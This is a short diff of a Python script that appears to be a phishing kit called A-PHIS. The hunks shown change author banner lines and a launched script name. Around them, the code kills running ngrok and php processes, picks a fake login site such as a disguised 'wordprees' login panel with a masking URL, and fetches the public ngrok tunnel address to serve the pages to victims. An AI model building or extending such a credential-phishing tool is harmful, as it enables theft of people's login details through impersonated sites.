@@ -15,6 +15,7 @@ os.system("killall ngrok> /dev/null 2>&1 || killall ngrok> /dev/null 2>&1")
 os.system("killall php> /dev/null 2>&1")
 os.system("clear")
 os.system("lolcat A-PHIS.py")
+print("       Author:ABIR HOSSAIN")
 def setup_site(website):
 	os.system("clear")
 main_opt=str(input(red+"\n[>] Select Your Option : "+yellow))
@@ -56,13 +57,13 @@ elif main_opt=="12":
 	website="wordprees"
 	mask='https://wordprees-login-panel'
 elif main_opt=="13":
-	os.system("python phis.py")
+	os.system("python a.py")
 else:
-	os.system("python phis.py")
+	os.system("python a.py")
 setup_site(website)
 os.system("clear")
 os.system("lolcat phislogo.py")
-print("Author:ABIR HOSSAIN")
+print("       Author:ABIR HOSSAIN")
 print()
 print(""+green+"plz wait  few seconde and  on your hotspot else its well not work")
 print()
@@ -95,7 +96,7 @@ time.sleep(1)
 print()
 os.system("clear")
 os.system("lolcat phislogo.py")
-print(Author:ABIRBHOSSAIN")
+print("       Author:ABIRBHOSSAIN")
 print()
 os.system("curl  http://localhost:4040/api/tunnels > tunnels.json")
 with open('tunnels.json') as data_file:    
